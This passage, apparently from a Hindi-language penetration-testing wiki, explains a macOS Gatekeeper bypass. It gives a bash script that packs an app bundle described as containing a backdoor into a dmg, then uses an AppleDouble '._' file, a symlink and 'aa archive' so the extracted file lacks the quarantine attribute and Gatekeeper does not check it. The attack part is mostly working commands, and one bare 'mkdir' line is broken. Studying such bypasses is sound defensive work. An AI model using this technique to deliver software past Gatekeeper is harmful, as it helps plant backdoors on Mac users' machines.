जब **dmg फ़ाइल को क्रियान्वित किया जाता है**, क्योंकि इसमें quarantine गुण नहीं है, यह **Gatekeeper को छलाएगा।**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### जांच रोकें xattr

एक ".app" बंडल में अगर quarantine xattr नहीं जोड़ा गया है, तो जब इसे निष्पादित किया जाएगा **तो Gatekeeper को ट्रिगर नहीं किया जाएगा**।
